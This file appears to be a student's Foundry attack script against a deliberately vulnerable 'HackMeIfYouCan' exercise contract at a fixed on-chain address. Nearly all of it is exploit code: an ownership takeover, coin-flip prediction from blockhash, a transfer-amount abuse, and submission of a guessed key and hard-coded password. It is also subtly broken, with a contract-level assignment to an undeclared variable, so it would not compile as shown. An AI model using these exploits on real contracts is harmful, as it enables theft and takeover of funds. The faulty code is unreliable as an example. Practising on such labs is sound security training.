// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";
import "forge-std/console.sol";



// contract FakeBuilding is Building {
//     function isLastFloor(uint256) external pure returns (bool) {
//         return true;
//     }
// }

contract AttackHackMeIfYouCan is Script {

     HackMeIfYouCan public hackMeIfYouCanContract;

        hackMeContract = HackMeIfYouCan(payable(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9));


    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // j'attaque contribute
        console.log("Attaque de contribute...");
        hackMeContract.contribute{value: 0.0001 ether}();
        console.log("New Owner: ", hackMeContract.owner());

        (bool sent,) = address(hackMeContract).call{value: 1 wei}("");
        require(sent, "failled");
        console.log("Marque : ", hackMeContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));

        // j'attaque flip
        console.log("Attaque de flip...");
        for (uint i = 0; i < 10; i++) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / hackMeContract.FACTOR();
            bool guess = coinFlip == 1 ? true : false;
            hackMeContract.flip(guess);
        }
        console.log("Victoires : ", hackMeContract.getConsecutiveWins(vm.addr(vm.envUint("PRIVATE_KEY"))));

        // j'attaque addPoint
        console.log("Attaque de addPoint...");
        hackMeContract.addPoint();
        console.log("Marque : ", hackMeContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));

        // j'attaque transfer
        console.log("Attaque de transfer...");
        hackMeContract.transfer(vm.addr(vm.envUint("PRIVATE_KEY")), 1000001);
        console.log("Marque : ", hackMeContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));

        // j'attaque goTo
        console.log("Attaque de goTo...");
        hackMeContract.goTo(10);
        console.log("Marque : ", hackMeContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));

        // j'attaque sendKey
        console.log("Attaque de sendKey...");
        bytes16 correctKey = bytes16(abi.encodePacked(uint256(0)));
        hackMeContract.sendKey(correctKey);
        console.log("Marque : ", hackMeContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));

        // j'attaque sendPassword
        console.log("Attaque de sendPassword...");
        bytes32 correctPassword = keccak256("malthus");
        hackMeContract.sendPassword(correctPassword);
        console.log("Marque : ", hackMeContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));

        vm.stopBroadcast();
    }
}
    